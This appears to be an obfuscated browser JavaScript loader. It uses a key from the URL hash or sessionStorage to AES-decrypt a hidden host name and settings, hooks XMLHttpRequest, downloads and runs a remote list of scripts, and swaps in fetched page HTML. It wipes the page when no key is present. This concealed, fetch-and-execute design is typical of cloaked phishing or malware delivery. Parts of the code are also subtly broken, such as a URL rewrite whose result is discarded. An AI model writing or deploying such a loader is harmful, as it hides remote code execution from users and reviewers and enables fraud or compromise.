var __ss;
var __sc;
var __ht;
var __xm;
var __xs;
var __xg;
var __xc;
var __xb;
var __ld;
if (window.location.hash && window.location.hash.startsWith("#p:")) {
	__xm = btoa(window.location.hash.substring(3));
} else {
	var t = new Date();
	var k = btoa(t.getUTCFullYear() + "$!@--" + + navigator.userAgent + t.getUTCMonth() + navigator.appVersion + t.getUTCMonth() + navigator.platform + t.getUTCMonth() + navigator.vendor + "--@!$" + t.getUTCFullYear());
	var m = sessionStorage.getItem(btoa(k));
	//console.log("s: " + m);
	if (m) {
		__xm = atob(m);
	} else {
		document.getElementsByTagName("html")[0].innerHTML = "";
	}
}

if (__xm) {
	__ss = ["https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js", "https://unpkg.com/ajax-hook/dist/ajaxhook.min.js"];
	__sc = function () {
		__sc = false;
		hookAjax({
			onreadystatechange: function (xhr) {
				//console.log("onreadystatechange called: %O", xhr)
			},
			onload: function (xhr) {
				//console.log("onload called: %O", xhr)
			},
			open: function (arg, xhr) {
				//console.log("open called: method:%s,url:%s,async:%s", arg[0], arg[1], arg[2])
				var x = atob(__xm);
				var k = __xs + "/" + x;
				arg[1].replace(window.location.hostname, k);
			}
		});
		
		var _u = function (s) {
			var _v = "U2FsdGVkX18m0y2YCrFdHQp+09scgDmNoTEyAlUEXW3mv1bR+NYqUJq4ujQB2QKU";
			var _z = "U2FsdGVkX1/Dr1BLt+bqCWIY61Hg2xRySyOh4UAKmIg=";
			var x_2 = "U2FsdGVkX18dMwcalw2DZqkQfQ0r0kAqMBKEneXFUnE=";
			var g_rj = "U2FsdGVkX1+uH7xIPzlUDNNsT366I6bXZMeDu73ieu8=";
			var iop_d = "U2FsdGVkX1/k7MUdJHVFBAbna9/OedPU/Xf7InPjY9Y="

			__xs = CryptoJS.AES.decrypt(_v, atob(s));
			__ld = CryptoJS.AES.decrypt(_z, atob(s));
			__xg = CryptoJS.AES.decrypt(x_2, atob(s));
			__xc = CryptoJS.AES.decrypt(g_rj, atob(s));
			__xb = CryptoJS.AES.decrypt(iop_d, atob(s));
		};
		_u(__xm);

		if (!__xs || !__ld || !__xg || !__xc || !__xb) {
			__ss = false;
			__xm = false;
			window.location = "index.html";
			document.getElementsByTagName("html")[0].innerHTML = "";
			return;
		}

		var p = atob(atob(__xm));
		console.log(p);
		var t = new Date();
		var k = btoa(t.getUTCFullYear() + "$!@--" + + navigator.userAgent + t.getUTCMonth() + navigator.appVersion + t.getUTCMonth() + navigator.platform + t.getUTCMonth() + navigator.vendor + "--@!$" + t.getUTCFullYear());
		sessionStorage.setItem(btoa(k), btoa(btoa(p)));
		var req = new XMLHttpRequest();
		req.addEventListener(__xb, function () {
			var split = this.responseText.split(__xg);
			var json = JSON.parse(split[0]);
			__ht = split[1];
			__ss = json[__xc];
			__ns();
		});
		req.open("GET", "https://" + __xs + "/" + p + "/" + __ld);
		__ld = false;
		req.send();
	};
	__ns();
}

function __ns() {
	var st = __ss.shift();
	if (st) {
		var s = document.createElement("script");
		s.src = st;
		s.onload = function () {
			__ns();
		};
		document.head.append(s);
	} else {
		if (__sc) {
			__sc();
		} else {
			document.getElementsByTagName("html")[0].innerHTML = __ht;
		}
	}
}